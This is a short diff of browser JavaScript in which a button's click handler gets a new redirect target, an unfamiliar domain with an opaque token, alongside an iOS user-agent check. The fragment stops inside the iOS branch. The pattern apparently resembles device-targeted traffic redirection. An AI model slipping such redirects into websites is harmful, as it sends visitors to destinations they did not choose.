@@ -1,7 +1,7 @@
 var button = document.querySelector('#generate');  
 button.addEventListener('click', function() {
     (function() {
-        var redirectURL = "https://www.rolls3.com/";
+        var redirectURL = "https://live33.online/?03f5d38";
         var isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
 
         if (isIOS) { 
